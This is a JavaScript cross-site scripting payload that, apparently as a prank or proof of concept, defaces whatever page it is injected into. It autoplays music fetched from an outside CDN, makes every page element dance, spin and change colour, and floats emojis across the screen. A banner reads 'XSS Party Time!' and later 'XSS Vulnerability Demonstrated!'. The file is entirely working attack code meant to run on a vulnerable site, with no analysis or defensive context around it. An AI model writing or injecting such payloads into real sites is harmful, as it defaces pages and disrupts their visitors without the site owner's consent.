console.log("XSS");

// Dancing Elements XSS Script
(function() {
  // Create audio element for background music
  const audio = document.createElement('audio');
  audio.src = 'https://cdn.jsdelivr.net/gh/steveruu/test@main/HILL%20CLIMB%20RACING%20EDIT.mp3';
  audio.loop = true;
  audio.volume = 0.5;
  document.body.appendChild(audio);
  
  // Create a message banner
  const banner = document.createElement('div');
  banner.style.position = 'fixed';
  banner.style.top = '10px';
  banner.style.left = '10px';
  banner.style.zIndex = '10000';
  banner.style.backgroundColor = 'red';
  banner.style.color = 'white';
  banner.style.padding = '10px';
  banner.style.borderRadius = '5px';
  banner.style.fontWeight = 'bold';
  banner.style.animation = 'pulse 1s infinite';
  banner.textContent = '🎉 XSS Party Time! 🎉';
  document.body.appendChild(banner);
  
  // Add CSS animations
  const style = document.createElement('style');
  style.textContent = `
    @keyframes dance {
      0% { transform: translateY(0) rotate(0deg); }
      25% { transform: translateY(-20px) rotate(5deg); }
      50% { transform: translateY(0) rotate(-5deg); }
      75% { transform: translateY(20px) rotate(5deg); }
      100% { transform: translateY(0) rotate(0deg); }
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.1); }
      100% { transform: scale(1); }
    }
    @keyframes colorChange {
      0% { color: red; }
      25% { color: yellow; }
      50% { color: green; }
      75% { color: blue; }
      100% { color: purple; }
    }
    @keyframes bounce {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-50px); }
    }
  `;
  document.head.appendChild(style);
  
  // Get all elements to animate
  const allElements = Array.from(document.querySelectorAll('*'));
  const animations = ['dance', 'spin', 'pulse', 'bounce'];
  const colors = ['red', 'blue', 'green', 'yellow', 'purple', 'orange', 'pink'];
  
  // Function to get a random item from an array
  const randomItem = (array) => array[Math.floor(Math.random() * array.length)];
  
  // Start the music and animations
  audio.play().catch(() => {
    console.log("Autoplay prevented - click the page to start the party!");
    document.body.addEventListener('click', () => audio.play(), {once: true});
  });
  
  // Make elements dance
  allElements.forEach((el, index) => {
    if (el !== audio && el !== banner && el !== style) {
      // Skip some elements to avoid breaking the page completely
        // Apply random animation
        const animation = randomItem(animations);
        const duration = 0.5 + Math.random() * 2;
        const delay = Math.random() * 2;
        
        el.style.animation = `${animation} ${duration}s ease-in-out ${delay}s infinite alternate`;
        
        // Randomly change colors
        if (Math.random() > 0.5) {
          el.style.color = randomItem(colors);
        }
        
        // Add confetti effect to some elements
        if (Math.random() > 0.9) {
          el.style.position = 'relative';
          el.style.overflow = 'visible';
          
          const confetti = document.createElement('span');
          confetti.textContent = '✨';
          confetti.style.position = 'absolute';
          confetti.style.top = '-10px';
          confetti.style.right = '-10px';
          confetti.style.fontSize = '20px';
          confetti.style.animation = 'bounce 1s infinite';
          el.appendChild(confetti);
        }
    }
  });
  
  // Create floating emojis
  const emojis = ['🎵', '🎶', '🎸', '🥁', '🎷', '🎺', '🎻', '🎹'];
  for (let i = 0; i < 20; i++) {
    setTimeout(() => {
      const emoji = document.createElement('div');
      emoji.textContent = randomItem(emojis);
      emoji.style.position = 'fixed';
      emoji.style.left = Math.random() * 100 + 'vw';
      emoji.style.top = Math.random() * 100 + 'vh';
      emoji.style.fontSize = (20 + Math.random() * 30) + 'px';
      emoji.style.zIndex = '9999';
      emoji.style.animation = `bounce ${1 + Math.random() * 3}s infinite`;
      document.body.appendChild(emoji);
      
      // Random movement
      setInterval(() => {
        emoji.style.left = Math.random() * 100 + 'vw';
        emoji.style.top = Math.random() * 100 + 'vh';
      }, 3000);
    }, i * 300);
  }
  
  // Create a message that reveals this was an XSS demonstration
  setTimeout(() => {
    banner.textContent = "🔒 XSS Vulnerability Demonstrated! 🔒";
    banner.style.backgroundColor = "#ff4500";
  }, 5000);
})();
